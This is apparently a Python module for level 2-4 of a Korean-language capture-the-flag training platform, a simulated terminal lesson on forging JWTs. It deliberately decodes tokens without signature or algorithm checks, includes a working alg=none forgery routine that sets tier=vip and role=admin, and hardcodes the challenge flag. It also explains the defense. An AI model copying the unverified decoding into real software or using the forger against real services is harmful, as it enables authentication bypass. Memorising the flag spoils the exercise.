from __future__ import annotations

import base64
import json
import shlex
from typing import Any, Dict, Tuple

from .level2_3 import issue_dispatch_token


LEVEL2_4_FLAG = "FLAG{JWT_SIGNATURE_MATTERS}"
DEFAULT_PARCEL_ID = "PD-2026-0001"


STATIC: Dict[str, Any] = {
    "id": "level2_4",
    "level": 2,
    "title": "2-4 Forge the VIP Pass",
    "summary": "서명 검증 없는 토큰은 위조 가능한 신분증이다.",
    "description": (
        "미션: dispatch_token을 위조해 tier=vip(또는 role=admin)로 바꾼 뒤 "
        "/actions/express 호출로 FLAG를 획득해라."
    ),
    "status": {"attack": "available", "defense": "locked"},
    "attack": {
        "hints": [
            {"platform": "all", "text": "2-3에서 본 dispatch_token을 수정해서 다시 보내봐."},
            {"platform": "all", "text": "핵심은 payload가 아니라 signature 검증이다."},
            {"platform": "all", "text": "header의 alg 값을 유심히 보고, 마지막 점(.) 뒤 서명 구조를 확인해."},
            {
                "platform": "windows",
                "text": 'curl.exe -v -X POST http://localhost:8000/api/v1/challenges/level2_4/actions/express -H "Authorization: Bearer <forged_token>"',
            },
            {
                "platform": "unix",
                "text": 'curl -v -X POST http://localhost:8000/api/v1/challenges/level2_4/actions/express -H "Authorization: Bearer <forged_token>"',
            },
            {"platform": "app", "text": "터미널에서 jwt-forge-none <token> 으로 학습용 위조 토큰을 만들 수 있어."},
        ],
        "terminal": {
            "enabled": True,
            "prompt": "$ ",
            "maxOutputBytes": 12000,
            "help": (
                "허용: curl .../level2_3/actions/dispatch, jwt-decode <token>, "
                "jwt-forge-none <token>, curl .../level2_4/actions/express -H \"Authorization: Bearer <token>\""
            ),
        },
        "flagFormat": "FLAG{...}",
    },
    "defense": {
        "enabled": False,
        "instruction": (
            "JWT는 decode만 하지 말고 반드시 verify(서명 검증)해야 한다. "
            "alg=none 금지, 알고리즘 화이트리스트 고정, 권한판단은 서버 정책으로 재검증."
        ),
        "code": {},
    },
}


def _b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode("utf-8").rstrip("=")


def _b64url_decode(raw: str) -> bytes:
    padded = raw + ("=" * ((4 - (len(raw) % 4)) % 4))
    return base64.urlsafe_b64decode(padded.encode("utf-8"))


def _parse_dispatch_payload(cmdline: str) -> Dict[str, Any]:
    parts = shlex.split(cmdline)
    data_key = "--data" if "--data" in parts else ("--data-raw" if "--data-raw" in parts else None)
    if not data_key:
        return {"parcel_id": DEFAULT_PARCEL_ID}
    idx = parts.index(data_key)
    if idx + 1 >= len(parts):
        return {"parcel_id": DEFAULT_PARCEL_ID}
    return json.loads(parts[idx + 1])


def decode_jwt_unsafe(token: str) -> Tuple[Dict[str, Any], Dict[str, Any]]:
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("JWT 형식 오류: header.payload.signature 구조여야 함")

    header_raw = _b64url_decode(parts[0]).decode("utf-8")
    payload_raw = _b64url_decode(parts[1]).decode("utf-8")
    header = json.loads(header_raw)
    payload = json.loads(payload_raw)

    # 의도적 취약점: signature/alg를 검증하지 않고 payload를 신뢰
    return header, payload


def _extract_bearer_from_curl(cmdline: str) -> str:
    parts = shlex.split(cmdline)
    for i, part in enumerate(parts):
        if part not in ("-H", "--header"):
            continue
        if i + 1 >= len(parts):
            continue
        raw_header = parts[i + 1]
        if ":" not in raw_header:
            continue
        key, value = raw_header.split(":", 1)
        if key.strip().lower() != "authorization":
            continue
        value = value.strip()
        if value.lower().startswith("bearer "):
            return value.split(" ", 1)[1].strip()
    return ""


def _forge_none_token(base_token: str) -> str:
    _, payload = decode_jwt_unsafe(base_token)
    payload["tier"] = "vip"
    payload["role"] = "admin"
    forged_header = {"alg": "none", "typ": "JWT"}
    head = _b64url_encode(json.dumps(forged_header, separators=(",", ":")).encode("utf-8"))
    body = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    return f"{head}.{body}."


def evaluate_express_access(token: str) -> Tuple[bool, Dict[str, Any]]:
    header, payload = decode_jwt_unsafe(token)
    tier = str(payload.get("tier", "")).strip().lower()
    role = str(payload.get("role", "")).strip().lower()
    return (tier == "vip" or role == "admin"), {"header": header, "payload": payload}


def check_flag(flag: str) -> bool:
    return flag.strip() == LEVEL2_4_FLAG


def judge_patch(_patched: list[str]) -> bool:
    return False


def terminal_exec(command: str) -> Tuple[str, str, int]:
    cmdline = command.strip()
    if not cmdline:
        return "", "", 0

    if cmdline in ("help", "?", "h"):
        return (
            "Allowed:\n"
            "  curl -v -X POST http://localhost:8000/api/v1/challenges/level2_3/actions/dispatch --data '{\"parcel_id\":\"PD-2026-0001\"}'\n"
            "  jwt-decode <token>\n"
            "  jwt-forge-none <token>\n"
            "  curl -v -X POST http://localhost:8000/api/v1/challenges/level2_4/actions/express -H \"Authorization: Bearer <token>\"\n"
        ), "", 0

    if cmdline.startswith("curl.exe "):
        cmdline = "curl " + cmdline[len("curl.exe ") :]

    if cmdline.startswith("jwt-decode "):
        token = cmdline[len("jwt-decode ") :].strip()
        if not token:
            return "", "usage: jwt-decode <token>", 1
        try:
            header, payload = decode_jwt_unsafe(token)
            pretty = json.dumps({"header": header, "payload": payload}, ensure_ascii=False, indent=2)
            return f"{pretty}\n", "", 0
        except Exception as exc:
            return "", f"decode error: {exc}", 1

    if cmdline.startswith("jwt-forge-none "):
        token = cmdline[len("jwt-forge-none ") :].strip()
        if not token:
            return "", "usage: jwt-forge-none <token>", 1
        try:
            forged = _forge_none_token(token)
            return f"{forged}\n", "", 0
        except Exception as exc:
            return "", f"forge error: {exc}", 1

    if cmdline.startswith("curl "):
        if "actions/dispatch" in cmdline:
            try:
                req = _parse_dispatch_payload(cmdline)
                parcel_id = str(req.get("parcel_id") or DEFAULT_PARCEL_ID)
            except Exception:
                parcel_id = DEFAULT_PARCEL_ID
            token = issue_dispatch_token(parcel_id)
            body = json.dumps({"status": "ok", "dispatch_token": token}, separators=(",", ":"))
            return f"{body}\n", "", 0

        if "actions/express" in cmdline:
            token = _extract_bearer_from_curl(cmdline)
            if not token:
                return "", 'Authorization 헤더가 필요해. 예: -H "Authorization: Bearer <token>"', 1
            try:
                allowed, detail = evaluate_express_access(token)
            except Exception as exc:
                return "", f"token parse error: {exc}", 1
            if allowed:
                body = json.dumps(
                    {
                        "status": "ok",
                        "lane": "express",
                        "flag": LEVEL2_4_FLAG,
                        "claims": detail["payload"],
                    },
                    separators=(",", ":"),
                )
                return f"{body}\n", "", 0
            body = json.dumps(
                {
                    "status": "denied",
                    "lane": "standard",
                    "message": "VIP token required",
                    "claims": detail["payload"],
                },
                separators=(",", ":"),
            )
            return f"{body}\n", "", 0

    return "", f"command not found: {cmdline}", 127

